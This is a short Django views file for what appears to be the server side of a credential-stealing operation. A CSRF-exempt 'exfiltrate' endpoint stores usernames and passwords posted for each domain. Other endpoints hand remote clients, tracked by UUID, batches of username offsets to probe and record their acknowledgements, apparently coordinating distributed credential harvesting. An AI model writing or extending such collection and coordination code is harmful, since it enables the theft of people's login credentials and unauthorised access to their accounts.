import json

from django.http import HttpResponse, JsonResponse
from django.template import loader
from django.utils import timezone
from django.views.decorators.csrf import csrf_exempt

from app import offset
from app.models import Credential, Domain, Client
from app.offset import next_username_offset
from client_utils import get_client


def index(request, domain):
    find = Domain.objects.get(name=domain)
    template = loader.get_template('app/index.html')
    context = {
        'domain': find
    }
    return HttpResponse(template.render(context, request))


@csrf_exempt
def exfiltrate(request, domain):
    find = Domain.objects.get(name=domain)
    cred_json = json.loads(request.body)
    cred = Credential(username=cred_json['username'], password=cred_json['password'], domain=find)
    cred.save()
    return HttpResponse(status=204)


def probes(request, domain):
    client_uuid = request.headers['X-CLIENT-UUID']
    client = get_client(request, client_uuid)
    next_offset = next_username_offset(Domain.objects.get(name=domain), client, timezone.now())
    return JsonResponse({'probes': list(next_offset.values())})


def ack(request, domain):
    client_uuid = request.headers['X-CLIENT-UUID']
    client = Client.objects.get(uuid=client_uuid)
    if client.current_offset is None:
        return HttpResponse(status=204)
    else:
        if client.current_offset is not None and client.current_offset.domain.name != domain:
            raise Exception('Bad domain for client {} that send ack for domain {}', client, domain)
        offset.ack(client)
        return HttpResponse(status=204)
